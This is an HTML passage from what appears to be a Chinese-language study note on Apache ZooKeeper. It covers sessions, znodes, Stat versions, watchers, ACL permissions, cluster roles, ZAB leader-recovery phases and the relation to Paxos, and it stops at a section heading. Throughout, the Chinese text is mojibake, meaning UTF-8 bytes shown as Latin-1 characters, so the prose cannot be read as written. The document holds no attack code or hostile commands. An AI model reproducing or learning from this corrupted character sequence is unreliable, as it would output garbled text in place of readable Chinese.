<li><strong>ZooKeeper  å°†æ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œè¿™ä¹Ÿå°±ä¿è¯äº†é«˜ååé‡å’Œä½å»¶è¿Ÿ</strong>ï¼ˆä½†æ˜¯å†…å­˜é™åˆ¶äº†èƒ½å¤Ÿå­˜å‚¨çš„å®¹é‡ä¸å¤ªå¤§ï¼Œæ­¤é™åˆ¶ä¹Ÿæ˜¯ä¿æŒznodeä¸­å­˜å‚¨çš„æ•°æ®é‡è¾ƒå°çš„è¿›ä¸€æ­¥åŸå› ï¼‰ã€‚</li>
<li><strong>ZooKeeper æ˜¯é«˜æ€§èƒ½çš„ã€‚ åœ¨â€œè¯»â€å¤šäºâ€œå†™â€çš„åº”ç”¨ç¨‹åºä¸­å°¤å…¶åœ°é«˜æ€§èƒ½ï¼Œå› ä¸ºâ€œå†™â€ä¼šå¯¼è‡´æ‰€æœ‰çš„æœåŠ¡å™¨é—´åŒæ­¥çŠ¶æ€ã€‚</strong>ï¼ˆâ€œè¯»â€å¤šäºâ€œå†™â€æ˜¯åè°ƒæœåŠ¡çš„å…¸å‹åœºæ™¯ã€‚ï¼‰</li>
<li><strong>ZooKeeperæœ‰ä¸´æ—¶èŠ‚ç‚¹çš„æ¦‚å¿µã€‚ å½“åˆ›å»ºä¸´æ—¶èŠ‚ç‚¹çš„å®¢æˆ·ç«¯ä¼šè¯ä¸€ç›´ä¿æŒæ´»åŠ¨ï¼Œç¬æ—¶èŠ‚ç‚¹å°±ä¸€ç›´å­˜åœ¨ã€‚è€Œå½“ä¼šè¯ç»ˆç»“æ—¶ï¼Œç¬æ—¶èŠ‚ç‚¹è¢«åˆ é™¤ã€‚æŒä¹…èŠ‚ç‚¹æ˜¯æŒ‡ä¸€æ—¦è¿™ä¸ªZNodeè¢«åˆ›å»ºäº†ï¼Œé™¤éä¸»åŠ¨è¿›è¡ŒZNodeçš„ç§»é™¤æ“ä½œï¼Œå¦åˆ™è¿™ä¸ªZNodeå°†ä¸€ç›´ä¿å­˜åœ¨Zookeeperä¸Šã€‚</strong></li>
<li>ZooKeeper åº•å±‚å…¶å®åªæä¾›äº†ä¸¤ä¸ªåŠŸèƒ½ï¼š
<ul>
<li>ç®¡ç†ï¼ˆå­˜å‚¨ã€è¯»å–ï¼‰ç”¨æˆ·ç¨‹åºæäº¤çš„æ•°æ®ï¼›</li>
<li>ä¸ºç”¨æˆ·ç¨‹åºæä¾›æ•°æ®èŠ‚ç‚¹ç›‘å¬æœåŠ¡ã€‚</li>
</ul>
</li>
</ul>
<h2 id="ä¼šè¯-session" tabindex="-1"> ä¼šè¯ï¼ˆSessionï¼‰</h2>
<p>Session æŒ‡çš„æ˜¯ ZooKeeper  æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ä¼šè¯ã€‚<strong>åœ¨ ZooKeeper ä¸­ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥æ˜¯æŒ‡å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¸€ä¸ª TCP é•¿è¿æ¥</strong>ã€‚å®¢æˆ·ç«¯å¯åŠ¨çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šä¸æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ª TCP è¿æ¥ï¼Œä»ç¬¬ä¸€æ¬¡è¿æ¥å»ºç«‹å¼€å§‹ï¼Œå®¢æˆ·ç«¯ä¼šè¯çš„ç”Ÿå‘½å‘¨æœŸä¹Ÿå¼€å§‹äº†ã€‚<strong>é€šè¿‡è¿™ä¸ªè¿æ¥ï¼Œå®¢æˆ·ç«¯èƒ½å¤Ÿé€šè¿‡å¿ƒè·³æ£€æµ‹ä¸æœåŠ¡å™¨ä¿æŒæœ‰æ•ˆçš„ä¼šè¯ï¼Œä¹Ÿèƒ½å¤Ÿå‘ZookeeperæœåŠ¡å™¨å‘é€è¯·æ±‚å¹¶æ¥å—å“åº”ï¼ŒåŒæ—¶è¿˜èƒ½å¤Ÿé€šè¿‡è¯¥è¿æ¥æ¥æ”¶æ¥è‡ªæœåŠ¡å™¨çš„Watchäº‹ä»¶é€šçŸ¥ã€‚</strong> Sessionçš„<code>sessionTimeout</code>å€¼ç”¨æ¥è®¾ç½®ä¸€ä¸ªå®¢æˆ·ç«¯ä¼šè¯çš„è¶…æ—¶æ—¶é—´ã€‚å½“ç”±äºæœåŠ¡å™¨å‹åŠ›å¤ªå¤§ã€ç½‘ç»œæ•…éšœæˆ–æ˜¯å®¢æˆ·ç«¯ä¸»åŠ¨æ–­å¼€è¿æ¥ç­‰å„ç§åŸå› å¯¼è‡´å®¢æˆ·ç«¯è¿æ¥æ–­å¼€æ—¶ï¼Œ<strong>åªè¦åœ¨<code>sessionTimeout</code>è§„å®šçš„æ—¶é—´å†…èƒ½å¤Ÿé‡æ–°è¿æ¥ä¸Šé›†ç¾¤ä¸­ä»»æ„ä¸€å°æœåŠ¡å™¨ï¼Œé‚£ä¹ˆä¹‹å‰åˆ›å»ºçš„ä¼šè¯ä»ç„¶æœ‰æ•ˆã€‚</strong></p>
<p><strong>åœ¨ä¸ºå®¢æˆ·ç«¯åˆ›å»ºä¼šè¯ä¹‹å‰ï¼ŒæœåŠ¡ç«¯é¦–å…ˆä¼šä¸ºæ¯ä¸ªå®¢æˆ·ç«¯éƒ½åˆ†é…ä¸€ä¸ªsessionIDã€‚ç”±äº sessionID æ˜¯ Zookeeper ä¼šè¯çš„ä¸€ä¸ªé‡è¦æ ‡è¯†ï¼Œè®¸å¤šä¸ä¼šè¯ç›¸å…³çš„è¿è¡Œæœºåˆ¶éƒ½æ˜¯åŸºäºè¿™ä¸ª sessionID çš„ï¼Œå› æ­¤ï¼Œæ— è®ºæ˜¯å“ªå°æœåŠ¡å™¨ä¸ºå®¢æˆ·ç«¯åˆ†é…çš„ sessionIDï¼Œéƒ½åŠ¡å¿…ä¿è¯å…¨å±€å”¯ä¸€ã€‚</strong></p>
<h2 id="znode" tabindex="-1"> Znode</h2>
<p><strong>åœ¨è°ˆåˆ°åˆ†å¸ƒå¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šå¸¸è¯´çš„â€œèŠ‚ç‚¹&quot;æ˜¯æŒ‡ç»„æˆé›†ç¾¤çš„æ¯ä¸€å°æœºå™¨ã€‚ç„¶è€Œï¼Œåœ¨Zookeeperä¸­ï¼Œâ€œèŠ‚ç‚¹&quot;åˆ†ä¸ºä¸¤ç±»ï¼Œç¬¬ä¸€ç±»åŒæ ·æ˜¯æŒ‡æ„æˆé›†ç¾¤çš„æœºå™¨ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæœºå™¨èŠ‚ç‚¹ï¼›ç¬¬äºŒç±»åˆ™æ˜¯æŒ‡æ•°æ®æ¨¡å‹ä¸­çš„æ•°æ®å•å…ƒï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæ•°æ®èŠ‚ç‚¹ä¸€ä¸€ZNodeã€‚</strong></p>
<p>Zookeeperå°†æ‰€æœ‰æ•°æ®å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œæ•°æ®æ¨¡å‹æ˜¯ä¸€æ£µæ ‘ï¼ˆZnode Tree)ï¼Œç”±æ–œæ ï¼ˆ/ï¼‰çš„è¿›è¡Œåˆ†å‰²çš„è·¯å¾„ï¼Œå°±æ˜¯ä¸€ä¸ªZnodeï¼Œä¾‹å¦‚/foo/path1ã€‚æ¯ä¸ªä¸Šéƒ½ä¼šä¿å­˜è‡ªå·±çš„æ•°æ®å†…å®¹ï¼ŒåŒæ—¶è¿˜ä¼šä¿å­˜ä¸€ç³»åˆ—å±æ€§ä¿¡æ¯ã€‚</p>
<p><strong>åœ¨Zookeeperä¸­ï¼Œnodeå¯ä»¥åˆ†ä¸ºæŒä¹…èŠ‚ç‚¹å’Œä¸´æ—¶èŠ‚ç‚¹ä¸¤ç±»ã€‚æ‰€è°“æŒä¹…èŠ‚ç‚¹æ˜¯æŒ‡ä¸€æ—¦è¿™ä¸ªZNodeè¢«åˆ›å»ºäº†ï¼Œé™¤éä¸»åŠ¨è¿›è¡ŒZNodeçš„ç§»é™¤æ“ä½œï¼Œå¦åˆ™è¿™ä¸ªZNodeå°†ä¸€ç›´ä¿å­˜åœ¨Zookeeperä¸Šã€‚è€Œä¸´æ—¶èŠ‚ç‚¹å°±ä¸ä¸€æ ·äº†ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸå’Œå®¢æˆ·ç«¯ä¼šè¯ç»‘å®šï¼Œä¸€æ—¦å®¢æˆ·ç«¯ä¼šè¯å¤±æ•ˆï¼Œé‚£ä¹ˆè¿™ä¸ªå®¢æˆ·ç«¯åˆ›å»ºçš„æ‰€æœ‰ä¸´æ—¶èŠ‚ç‚¹éƒ½ä¼šè¢«ç§»é™¤ã€‚</strong> å¦å¤–ï¼ŒZooKeeperè¿˜å…è®¸ç”¨æˆ·ä¸ºæ¯ä¸ªèŠ‚ç‚¹æ·»åŠ ä¸€ä¸ªç‰¹æ®Šçš„å±æ€§ï¼š<strong>SEQUENTIAL</strong>.ä¸€æ—¦èŠ‚ç‚¹è¢«æ ‡è®°ä¸Šè¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªèŠ‚ç‚¹è¢«åˆ›å»ºçš„æ—¶å€™ï¼ŒZookeeperä¼šè‡ªåŠ¨åœ¨å…¶èŠ‚ç‚¹ååé¢è¿½åŠ ä¸Šä¸€ä¸ªæ•´å‹æ•°å­—ï¼Œè¿™ä¸ªæ•´å‹æ•°å­—æ˜¯ä¸€ä¸ªç”±çˆ¶èŠ‚ç‚¹ç»´æŠ¤çš„è‡ªå¢æ•°å­—ã€‚</p>
<h2 id="ç‰ˆæœ¬" tabindex="-1"> ç‰ˆæœ¬</h2>
<p>åœ¨å‰é¢æˆ‘ä»¬å·²ç»æåˆ°ï¼ŒZookeeper çš„æ¯ä¸ª ZNode ä¸Šéƒ½ä¼šå­˜å‚¨æ•°æ®ï¼Œå¯¹åº”äºæ¯ä¸ªZNodeï¼ŒZookeeper éƒ½ä¼šä¸ºå…¶ç»´æŠ¤ä¸€ä¸ªå«ä½œ <strong>Stat</strong> çš„æ•°æ®ç»“æ„ï¼ŒStat ä¸­è®°å½•äº†è¿™ä¸ª ZNode çš„ä¸‰ä¸ªæ•°æ®ç‰ˆæœ¬ï¼Œåˆ†åˆ«æ˜¯versionï¼ˆå½“å‰ZNodeçš„ç‰ˆæœ¬ï¼‰ã€cversionï¼ˆå½“å‰ZNodeå­èŠ‚ç‚¹çš„ç‰ˆæœ¬ï¼‰å’Œ aversionï¼ˆå½“å‰ZNodeçš„ACLç‰ˆæœ¬ï¼‰ã€‚</p>
<h2 id="watcher" tabindex="-1"> Watcher</h2>
<p><strong>Watcherï¼ˆäº‹ä»¶ç›‘å¬å™¨ï¼‰ï¼Œæ˜¯Zookeeperä¸­çš„ä¸€ä¸ªå¾ˆé‡è¦çš„ç‰¹æ€§ã€‚Zookeeperå…è®¸ç”¨æˆ·åœ¨æŒ‡å®šèŠ‚ç‚¹ä¸Šæ³¨å†Œä¸€äº›Watcherï¼Œå¹¶ä¸”åœ¨ä¸€äº›ç‰¹å®šäº‹ä»¶è§¦å‘çš„æ—¶å€™ï¼ŒZooKeeperæœåŠ¡ç«¯ä¼šå°†äº‹ä»¶é€šçŸ¥åˆ°æ„Ÿå…´è¶£çš„å®¢æˆ·ç«¯ä¸Šå»ï¼Œè¯¥æœºåˆ¶æ˜¯Zookeeperå®ç°åˆ†å¸ƒå¼åè°ƒæœåŠ¡çš„é‡è¦ç‰¹æ€§ã€‚</strong></p>
<h2 id="acl" tabindex="-1"> ACL</h2>
<p>Zookeeperé‡‡ç”¨ACLï¼ˆAccessControlListsï¼‰ç­–ç•¥æ¥è¿›è¡Œæƒé™æ§åˆ¶ï¼Œç±»ä¼¼äº UNIX æ–‡ä»¶ç³»ç»Ÿçš„æƒé™æ§åˆ¶ã€‚Zookeeper å®šä¹‰äº†å¦‚ä¸‹5ç§æƒé™ã€‚</p>
<ul>
<li>CREATEï¼šåˆ›å»ºå­èŠ‚ç‚¹çš„æƒé™</li>
<li>READï¼šè·å–èŠ‚ç‚¹æ•°æ®å’Œå­èŠ‚ç‚¹åˆ—è¡¨çš„æƒé™</li>
<li>WRITEï¼šæ›´æ–°èŠ‚ç‚¹æ•°æ®çš„æƒé™</li>
<li>DELETEï¼šåˆ é™¤å­èŠ‚ç‚¹çš„æƒé™</li>
<li>ADMINï¼šè®¾ç½®èŠ‚ç‚¹ACLçš„æƒé™</li>
</ul>
<p>å…¶ä¸­å°¤å…¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCREATEå’ŒDELETEè¿™ä¸¤ç§æƒé™éƒ½æ˜¯é’ˆå¯¹å­èŠ‚ç‚¹çš„æƒé™æ§åˆ¶ã€‚</p>
<h1 id="zookeeper-ç‰¹ç‚¹" tabindex="-1"> ZooKeeper ç‰¹ç‚¹</h1>
<ul>
<li><strong>é¡ºåºä¸€è‡´æ€§ï¼š</strong> ä»åŒä¸€å®¢æˆ·ç«¯å‘èµ·çš„äº‹åŠ¡è¯·æ±‚ï¼Œæœ€ç»ˆå°†ä¼šä¸¥æ ¼åœ°æŒ‰ç…§é¡ºåºè¢«åº”ç”¨åˆ° ZooKeeper ä¸­å»ã€‚</li>
<li><strong>åŸå­æ€§ï¼š</strong> æ‰€æœ‰äº‹åŠ¡è¯·æ±‚çš„å¤„ç†ç»“æœåœ¨æ•´ä¸ªé›†ç¾¤ä¸­æ‰€æœ‰æœºå™¨ä¸Šçš„åº”ç”¨æƒ…å†µæ˜¯ä¸€è‡´çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¦ä¹ˆæ•´ä¸ªé›†ç¾¤ä¸­æ‰€æœ‰çš„æœºå™¨éƒ½æˆåŠŸåº”ç”¨äº†æŸä¸€ä¸ªäº‹åŠ¡ï¼Œè¦ä¹ˆéƒ½æ²¡æœ‰åº”ç”¨ã€‚</li>
<li><strong>å•ä¸€ç³»ç»Ÿæ˜ åƒ ï¼š</strong> æ— è®ºå®¢æˆ·ç«¯è¿åˆ°å“ªä¸€ä¸ª ZooKeeper æœåŠ¡å™¨ä¸Šï¼Œå…¶çœ‹åˆ°çš„æœåŠ¡ç«¯æ•°æ®æ¨¡å‹éƒ½æ˜¯ä¸€è‡´çš„ã€‚</li>
<li><strong>å¯é æ€§ï¼š</strong> ä¸€æ—¦ä¸€æ¬¡æ›´æ”¹è¯·æ±‚è¢«åº”ç”¨ï¼Œæ›´æ”¹çš„ç»“æœå°±ä¼šè¢«æŒä¹…åŒ–ï¼Œç›´åˆ°è¢«ä¸‹ä¸€æ¬¡æ›´æ”¹è¦†ç›–ã€‚</li>
</ul>
<h1 id="zookeeper-è®¾è®¡ç›®æ ‡" tabindex="-1"> ZooKeeper è®¾è®¡ç›®æ ‡</h1>
<h2 id="ç®€å•çš„æ•°æ®æ¨¡å‹" tabindex="-1"> ç®€å•çš„æ•°æ®æ¨¡å‹</h2>
<p>ZooKeeper å…è®¸åˆ†å¸ƒå¼è¿›ç¨‹é€šè¿‡å…±äº«çš„å±‚æ¬¡ç»“æ„å‘½åç©ºé—´è¿›è¡Œç›¸äº’åè°ƒï¼Œè¿™ä¸æ ‡å‡†æ–‡ä»¶ç³»ç»Ÿç±»ä¼¼ã€‚ åç§°ç©ºé—´ç”± ZooKeeper ä¸­çš„æ•°æ®å¯„å­˜å™¨ç»„æˆ - ç§°ä¸ºznodeï¼Œè¿™äº›ç±»ä¼¼äºæ–‡ä»¶å’Œç›®å½•ã€‚ ä¸ä¸ºå­˜å‚¨è®¾è®¡çš„å…¸å‹æ–‡ä»¶ç³»ç»Ÿä¸åŒï¼ŒZooKeeperæ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œè¿™æ„å‘³ç€ZooKeeperå¯ä»¥å®ç°é«˜ååé‡å’Œä½å»¶è¿Ÿã€‚</p>
<p><img src="@source/assets/cs-note/framework/zookeeper/ZooKeeperæ•°æ®æ¨¡å‹.png" alt="ZooKeeperæ•°æ®æ¨¡å‹" loading="lazy"></p>
<h2 id="å¯æ„å»ºé›†ç¾¤" tabindex="-1"> å¯æ„å»ºé›†ç¾¤</h2>
<p><strong>ä¸ºäº†ä¿è¯é«˜å¯ç”¨ï¼Œæœ€å¥½æ˜¯ä»¥é›†ç¾¤å½¢æ€æ¥éƒ¨ç½² ZooKeeperï¼Œè¿™æ ·åªè¦é›†ç¾¤ä¸­å¤§éƒ¨åˆ†æœºå™¨æ˜¯å¯ç”¨çš„ï¼ˆèƒ½å¤Ÿå®¹å¿ä¸€å®šçš„æœºå™¨æ•…éšœï¼‰ï¼Œé‚£ä¹ˆzookeeperæœ¬èº«ä»ç„¶æ˜¯å¯ç”¨çš„ã€‚</strong> å®¢æˆ·ç«¯åœ¨ä½¿ç”¨ ZooKeeper æ—¶ï¼Œéœ€è¦çŸ¥é“é›†ç¾¤æœºå™¨åˆ—è¡¨ï¼Œé€šè¿‡ä¸é›†ç¾¤ä¸­çš„æŸä¸€å°æœºå™¨å»ºç«‹ TCP è¿æ¥æ¥ä½¿ç”¨æœåŠ¡ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨è¿™ä¸ªTCPé“¾æ¥æ¥å‘é€è¯·æ±‚ã€è·å–ç»“æœã€è·å–ç›‘å¬äº‹ä»¶ä»¥åŠå‘é€å¿ƒè·³åŒ…ã€‚å¦‚æœè¿™ä¸ªè¿æ¥å¼‚å¸¸æ–­å¼€äº†ï¼Œå®¢æˆ·ç«¯å¯ä»¥è¿æ¥åˆ°å¦å¤–çš„æœºå™¨ä¸Šã€‚</p>
<p><strong>ZooKeeper å®˜æ–¹æä¾›çš„æ¶æ„å›¾ï¼š</strong></p>
<p><img src="@source/assets/cs-note/framework/zookeeper/ZooKeeperæ¶æ„.png" alt="ZooKeeperæ¶æ„" loading="lazy"></p>
<p>ä¸Šå›¾ä¸­æ¯ä¸€ä¸ªServerä»£è¡¨ä¸€ä¸ªå®‰è£…ZookeeperæœåŠ¡çš„æœåŠ¡å™¨ã€‚ç»„æˆ ZooKeeper æœåŠ¡çš„æœåŠ¡å™¨éƒ½ä¼šåœ¨å†…å­˜ä¸­ç»´æŠ¤å½“å‰çš„æœåŠ¡å™¨çŠ¶æ€ï¼Œå¹¶ä¸”æ¯å°æœåŠ¡å™¨ä¹‹é—´éƒ½äº’ç›¸ä¿æŒç€é€šä¿¡ã€‚é›†ç¾¤é—´é€šè¿‡ Zab åè®®ï¼ˆZookeeper Atomic Broadcastï¼‰æ¥ä¿æŒæ•°æ®çš„ä¸€è‡´æ€§ã€‚</p>
<h2 id="é¡ºåºè®¿é—®" tabindex="-1"> é¡ºåºè®¿é—®</h2>
<p><strong>å¯¹äºæ¥è‡ªå®¢æˆ·ç«¯çš„æ¯ä¸ªæ›´æ–°è¯·æ±‚ï¼ŒZooKeeper éƒ½ä¼šåˆ†é…ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„é€’å¢ç¼–å·ï¼Œè¿™ä¸ªç¼–å·ååº”äº†æ‰€æœ‰äº‹åŠ¡æ“ä½œçš„å…ˆåé¡ºåºï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨ ZooKeeper è¿™ä¸ªç‰¹æ€§æ¥å®ç°æ›´é«˜å±‚æ¬¡çš„åŒæ­¥åŸè¯­ã€‚</strong> <strong>è¿™ä¸ªç¼–å·ä¹Ÿå«åšæ—¶é—´æˆ³â€”â€”zxidï¼ˆZookeeper Transaction Idï¼‰</strong></p>
<h2 id="é«˜æ€§èƒ½" tabindex="-1"> é«˜æ€§èƒ½</h2>
<p><strong>ZooKeeper æ˜¯é«˜æ€§èƒ½çš„ã€‚ åœ¨â€œè¯»â€å¤šäºâ€œå†™â€çš„åº”ç”¨ç¨‹åºä¸­å°¤å…¶åœ°é«˜æ€§èƒ½ï¼Œå› ä¸ºâ€œå†™â€ä¼šå¯¼è‡´æ‰€æœ‰çš„æœåŠ¡å™¨é—´åŒæ­¥çŠ¶æ€ã€‚ï¼ˆâ€œè¯»â€å¤šäºâ€œå†™â€æ˜¯åè°ƒæœåŠ¡çš„å…¸å‹åœºæ™¯ã€‚ï¼‰</strong></p>
<h1 id="zookeeper-é›†ç¾¤è§’è‰²ä»‹ç»" tabindex="-1"> ZooKeeper é›†ç¾¤è§’è‰²ä»‹ç»</h1>
<p><strong>æœ€å…¸å‹é›†ç¾¤æ¨¡å¼ï¼š Master/Slave æ¨¡å¼ï¼ˆä¸»å¤‡æ¨¡å¼ï¼‰</strong>ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œé€šå¸¸ MasteræœåŠ¡å™¨ä½œä¸ºä¸»æœåŠ¡å™¨æä¾›å†™æœåŠ¡ï¼Œå…¶ä»–çš„ Slave æœåŠ¡å™¨ä»æœåŠ¡å™¨é€šè¿‡å¼‚æ­¥å¤åˆ¶çš„æ–¹å¼è·å– Master æœåŠ¡å™¨æœ€æ–°çš„æ•°æ®æä¾›è¯»æœåŠ¡ã€‚</p>
<p>ä½†æ˜¯ï¼Œ<strong>åœ¨ ZooKeeper ä¸­æ²¡æœ‰é€‰æ‹©ä¼ ç»Ÿçš„  Master/Slave æ¦‚å¿µï¼Œè€Œæ˜¯å¼•å…¥äº†Leaderã€Follower å’Œ Observer ä¸‰ç§è§’è‰²</strong>ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="@source/assets/cs-note/framework/zookeeper/ZooKeeperé›†ç¾¤è§’è‰².png" alt="" loading="lazy"></p>
<p><strong>ZooKeeper é›†ç¾¤ä¸­çš„æ‰€æœ‰æœºå™¨é€šè¿‡ä¸€ä¸ª Leader é€‰ä¸¾è¿‡ç¨‹æ¥é€‰å®šä¸€å°ç§°ä¸º â€œLeaderâ€ çš„æœºå™¨ï¼ŒLeader æ—¢å¯ä»¥ä¸ºå®¢æˆ·ç«¯æä¾›å†™æœåŠ¡åˆèƒ½æä¾›è¯»æœåŠ¡ã€‚é™¤äº† Leader å¤–ï¼ŒFollower å’Œ  Observer éƒ½åªèƒ½æä¾›è¯»æœåŠ¡ã€‚Follower å’Œ  Observer å”¯ä¸€çš„åŒºåˆ«åœ¨äº Observer æœºå™¨ä¸å‚ä¸ Leader çš„é€‰ä¸¾è¿‡ç¨‹ï¼Œä¹Ÿä¸å‚ä¸å†™æ“ä½œçš„â€œè¿‡åŠå†™æˆåŠŸâ€ç­–ç•¥ï¼Œå› æ­¤ Observer æœºå™¨å¯ä»¥åœ¨ä¸å½±å“å†™æ€§èƒ½çš„æƒ…å†µä¸‹æå‡é›†ç¾¤çš„è¯»æ€§èƒ½ã€‚</strong></p>
<div>
<table>
  	<tr>
		<td colspan="2">è§’è‰²</td>
		<td>ä¸»è¦å·¥ä½œæè¿°</td>
	</tr>
    <tr>
		<td colspan="2">é¢†å¯¼è€…(Leader)</td>
		<td>
        1. äº‹åŠ¡è¯·æ±‚çš„å”¯ä¸€è°ƒåº¦å’Œå¤„ç†è€…ï¼Œä¿è¯é›†ç¾¤äº‹åŠ¡å¤„ç†çš„é¡ºåºæ€§
        2. é›†ç¾¤å†…éƒ¨ä¸ªæœåŠ¡å™¨çš„è°ƒåº¦è€…</td>
	</tr>
    <tr>
		<td rowspan="2">å­¦ä¹ è€…(Learner)</td>
        <td>è·Ÿéšè€…(Follower)</td>
		<td>
        1. å¤„ç†å®¢æˆ·ç«¯éäº‹åŠ¡è¯·æ±‚ï¼Œè½¬å‘äº‹åŠ¡è¯·æ±‚ç»™LeaderæœåŠ¡å™¨
        2. å‚ä¸äº‹åŠ¡è¯·æ±‚Proposalçš„æŠ•ç¥¨
        3. å‚ä¸Leaderé€‰ä¸¾çš„æŠ•ç¥¨</td>
	</tr>
    <tr>
        <td>è§‚å¯Ÿè€…(Observer)</td>
		<td>Followerå’ŒObserverå”¯ä¸€çš„åŒºåˆ«åœ¨äºObserveræœºå™¨ä¸å‚ä¸Leaderçš„é€‰ä¸¾ï¼Œä¹Ÿä¸å‚ä¸å†™æ“ä½œçš„"è¿‡åŠå†™æˆåŠŸ"ç­–ç•¥ï¼Œ
        å› æ­¤Observeræœºå™¨å¯ä»¥ä¸å½±å“å†™æ€§èƒ½çš„æƒ…å†µä¸‹æå‡é›†ç¾¤çš„è¯»æ€§èƒ½</td>
	</tr>
    <tr>
		<td colspan="2">å®¢æˆ·ç«¯(Client)</td>
		<td>è¯·æ±‚å‘èµ·æ–¹</td>
	</tr>
</table>
</div>
<p><strong>å½“ Leader æœåŠ¡å™¨å‡ºç°ç½‘ç»œä¸­æ–­ã€å´©æºƒé€€å‡ºä¸é‡å¯ç­‰å¼‚å¸¸æƒ…å†µæ—¶ï¼ŒZAB åè®®å°±ä¼šè¿›äººæ¢å¤æ¨¡å¼å¹¶é€‰ä¸¾äº§ç”Ÿæ–°çš„LeaderæœåŠ¡å™¨ã€‚è¿™ä¸ªè¿‡ç¨‹å¤§è‡´æ˜¯è¿™æ ·çš„ï¼š</strong></p>
<ol>
<li>Leader electionï¼ˆé€‰ä¸¾é˜¶æ®µï¼‰ï¼šèŠ‚ç‚¹åœ¨ä¸€å¼€å§‹éƒ½å¤„äºé€‰ä¸¾é˜¶æ®µï¼Œåªè¦æœ‰ä¸€ä¸ªèŠ‚ç‚¹å¾—åˆ°è¶…åŠæ•°èŠ‚ç‚¹çš„ç¥¨æ•°ï¼Œå®ƒå°±å¯ä»¥å½“é€‰å‡† leaderã€‚</li>
<li>Discoveryï¼ˆå‘ç°é˜¶æ®µï¼‰ï¼šåœ¨è¿™ä¸ªé˜¶æ®µï¼Œfollowers è·Ÿå‡† leader è¿›è¡Œé€šä¿¡ï¼ŒåŒæ­¥ followers æœ€è¿‘æ¥æ”¶çš„äº‹åŠ¡æè®®ã€‚</li>
<li>Synchronizationï¼ˆåŒæ­¥é˜¶æ®µï¼‰:åŒæ­¥é˜¶æ®µä¸»è¦æ˜¯åˆ©ç”¨ leader å‰ä¸€é˜¶æ®µè·å¾—çš„æœ€æ–°æè®®å†å²ï¼ŒåŒæ­¥é›†ç¾¤ä¸­æ‰€æœ‰çš„å‰¯æœ¬ã€‚åŒæ­¥å®Œæˆä¹‹å
å‡† leader æ‰ä¼šæˆä¸ºçœŸæ­£çš„ leaderã€‚</li>
<li>Broadcastï¼ˆå¹¿æ’­é˜¶æ®µï¼‰
åˆ°äº†è¿™ä¸ªé˜¶æ®µï¼ŒZookeeper é›†ç¾¤æ‰èƒ½æ­£å¼å¯¹å¤–æä¾›äº‹åŠ¡æœåŠ¡ï¼Œå¹¶ä¸” leader å¯ä»¥è¿›è¡Œæ¶ˆæ¯å¹¿æ’­ã€‚åŒæ—¶å¦‚æœæœ‰æ–°çš„èŠ‚ç‚¹åŠ å…¥ï¼Œè¿˜éœ€è¦å¯¹æ–°èŠ‚ç‚¹è¿›è¡ŒåŒæ­¥ã€‚</li>
</ol>
<h1 id="zookeeper-zabåè®®-paxosç®—æ³•" tabindex="-1"> ZooKeeper &amp; ZABåè®® &amp; Paxosç®—æ³•</h1>
<h2 id="zabåè®®-paxosç®—æ³•" tabindex="-1"> ZABåè®® &amp; Paxosç®—æ³•</h2>
<p>Paxos ç®—æ³•åº”è¯¥å¯ä»¥è¯´æ˜¯  ZooKeeper çš„çµé­‚äº†ã€‚ä½†æ˜¯ï¼ŒZooKeeper å¹¶æ²¡æœ‰å®Œå…¨é‡‡ç”¨ Paxosç®—æ³• ï¼Œè€Œæ˜¯ä½¿ç”¨ ZAB åè®®ä½œä¸ºå…¶ä¿è¯æ•°æ®ä¸€è‡´æ€§çš„æ ¸å¿ƒç®—æ³•ã€‚å¦å¤–ï¼Œåœ¨ZooKeeperçš„å®˜æ–¹æ–‡æ¡£ä¸­ä¹ŸæŒ‡å‡ºï¼ŒZABåè®®å¹¶ä¸åƒ Paxos ç®—æ³•é‚£æ ·ï¼Œæ˜¯ä¸€ç§é€šç”¨çš„åˆ†å¸ƒå¼ä¸€è‡´æ€§ç®—æ³•ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹åˆ«ä¸ºZookeeperè®¾è®¡çš„å´©æºƒå¯æ¢å¤çš„åŸå­æ¶ˆæ¯å¹¿æ’­ç®—æ³•ã€‚</p>
<h2 id="zab-åè®®ä»‹ç»" tabindex="-1"> ZAB åè®®ä»‹ç»</h2>
<p><strong>ZABï¼ˆZooKeeper Atomic Broadcast åŸå­å¹¿æ’­ï¼‰ åè®®æ˜¯ä¸ºåˆ†å¸ƒå¼åè°ƒæœåŠ¡ ZooKeeper ä¸“é—¨è®¾è®¡çš„ä¸€ç§æ”¯æŒå´©æºƒæ¢å¤çš„åŸå­å¹¿æ’­åè®®ã€‚ åœ¨ ZooKeeper ä¸­ï¼Œä¸»è¦ä¾èµ– ZAB åè®®æ¥å®ç°åˆ†å¸ƒå¼æ•°æ®ä¸€è‡´æ€§ï¼ŒåŸºäºè¯¥åè®®ï¼ŒZooKeeper å®ç°äº†ä¸€ç§ä¸»å¤‡æ¨¡å¼çš„ç³»ç»Ÿæ¶æ„æ¥ä¿æŒé›†ç¾¤ä¸­å„ä¸ªå‰¯æœ¬ä¹‹é—´çš„æ•°æ®ä¸€è‡´æ€§ã€‚</strong></p>
<h2 id="zab-åè®®ä¸¤ç§åŸºæœ¬çš„æ¨¡å¼-å´©æºƒæ¢å¤å’Œæ¶ˆæ¯å¹¿æ’­" tabindex="-1"> ZAB åè®®ä¸¤ç§åŸºæœ¬çš„æ¨¡å¼ï¼šå´©æºƒæ¢å¤å’Œæ¶ˆæ¯å¹¿æ’­</h2>
